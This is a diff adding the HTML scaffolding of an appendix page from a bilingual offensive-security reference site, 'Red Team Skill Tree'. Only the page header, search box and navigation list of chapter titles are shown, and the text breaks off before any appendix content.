@@ -1,0 +1,5731 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Full-stack offensive security reference — anti-attribution, reconnaissance, AD attacks, C2 development, AV/EDR evasion, cloud-native and AI-powered attacks, updated with 2025-2026 APT techniques.">
+      
+      
+      
+        <link rel="canonical" href="https://lupingqaq.github.io/red-team-skill-tree/zh-CN/appendix/">
+      
+      
+        <link rel="prev" href="../ch-24/">
+      
+      
+      
+        
+          <link rel="alternate" href="/red-team-skill-tree/" hreflang="en">
+        
+          <link rel="alternate" href="/red-team-skill-tree/zh-CN/" hreflang="zh">
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>附录 — 原始大纲 - Red Team Skill Tree</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Red Team Skill Tree" class="md-header__button md-logo" aria-label="Red Team Skill Tree" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Red Team Skill Tree
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              附录 — 原始大纲
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+      <div class="md-header__option">
+  <div class="md-select">
+    
+    <button class="md-header__button md-icon" aria-label="Select language">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12.87 15.07-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2zm-2.62 7 1.62-4.33L19.12 17z"/></svg>
+    </button>
+    <div class="md-select__inner">
+      <ul class="md-select__list">
+        
+          <li class="md-select__item">
+            <a href="/red-team-skill-tree/" hreflang="en" class="md-select__link">
+              English
+            </a>
+          </li>
+        
+          <li class="md-select__item">
+            <a href="/red-team-skill-tree/zh-CN/" hreflang="zh" class="md-select__link">
+              简体中文
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/lupingQAQ/red-team-skill-tree" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    lupingQAQ/red-team-skill-tree
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Red Team Skill Tree" class="md-nav__button md-logo" aria-label="Red Team Skill Tree" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Red Team Skill Tree
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/lupingQAQ/red-team-skill-tree" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    lupingQAQ/red-team-skill-tree
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1. Anti-Attribution and Anonymization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2. Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3. Penetration Testing in Practice
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-04/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4. Code Audit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-05/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5. Post-Exploitation and Internal Network Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-06/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6. Server and Personal PC Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-07/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7. Phishing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-08/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8. RAT/C2 Tool Development
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-09/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9. Trojan AV/EDR Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10. Evidence Image System Restore (Linux)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-11/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    11. Practical Wordlists and Toolkits
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-12/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    12. AI-Powered Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-13/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    13. Cloud-Native Attack and Defense
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-14/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    14. Modern C2 Evolution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-15/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    15. Advanced Evasion Techniques
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-16/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    16. Latest AD/Infrastructure Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-17/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    17. Initial Access Evolution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-18/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    18. Cloud Post-Exploitation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-19/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    19. HVV / Red-vs-Blue Practical Topics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-20/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    20. Zero Trust Environment Bypass
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-21/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    21. OT/ICS Industrial Control Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-22/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    22. Mobile Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-23/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    23. Living off the Land (LotL) Attack Chains
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ch-24/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    24. Outdated Content Warnings and Alternatives
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../appendix/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Appendix — Raw Outline
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_27" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_27" id="__nav_27_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    简体中文
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_27_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_27">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    简体中文
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1. 反溯源与匿名化
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2. 信息收集
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3. 渗透实战
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-04/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4. 代码审计
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-05/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5. 后渗透与内网横向
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-06/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6. 服务器及个人PC信息收集
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-07/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7. 钓鱼
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-08/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8. 远控工具开发
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-09/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9. 木马免杀
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10. 调证镜像系统还原(Linux)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-11/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    11. 实战字典与工具包
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-12/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    12. AI赋能攻击
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-13/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    13. 云原生攻防
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-14/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    14. 现代C2演进
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-15/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    15. 高级规避技术
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-16/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    16. 最新AD/基础设施攻击
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-17/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    17. 初始访问演进
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-18/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    18. Cloud Post-Exploitation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-19/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    19. HW/红蓝对抗实战专题
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-20/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    20. 零信任环境绕过
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-21/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    21. OT/ICS工控安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-22/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    22. 移动端攻击
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-23/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    23. Living off the Land (LotL) 攻击链
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-24/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    24. 过时内容警告与替代方案
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    附录 — 原始大纲
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    附录 — 原始大纲
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
